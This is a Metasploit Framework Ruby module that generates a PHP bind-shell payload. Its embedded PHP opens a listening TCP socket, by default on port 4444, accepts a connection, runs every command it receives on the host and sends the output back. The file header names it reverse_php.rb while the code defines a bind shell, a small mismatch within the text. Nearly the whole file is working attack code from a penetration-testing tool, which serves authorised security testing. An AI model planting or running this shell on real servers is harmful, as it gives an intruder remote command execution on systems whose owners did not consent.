##
# $Id: reverse_php.rb 5461 2008-04-01 02:08:19Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/php'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Php

module BindTcp

	include Msf::Payload::Single
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Bind TCP (via php)',
			'Version'       => '$Revision: 5461 $',
			'Description'   => 'PHP bind shell',
			'Author'        => 'egypt <egypt@nmt.edu>',
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	def php_bind_shell

		if (!datastore['LPORT'] or datastore['LPORT'].empty?)
			# datastore is empty on msfconsole startup
			port = 4444
		else
			port = datastore['LPORT']
		end

		shell=<<-END_OF_PHP_CODE
		$port=#{port};

		$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$ret = socket_bind($sock, 0, $port);
		$ret = socket_listen($sock, 5);
		$client = socket_accept($sock);

		while (true) {
			$cmd = socket_read($client, 2048, PHP_NORMAL_READ);
			#{get_system_block("$cmd")}
			socket_write($client, $output, strlen($output));
		} 
		socket_close($sock);
		END_OF_PHP_CODE

		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return super + php_bind_shell
	end
	

end

end end end end
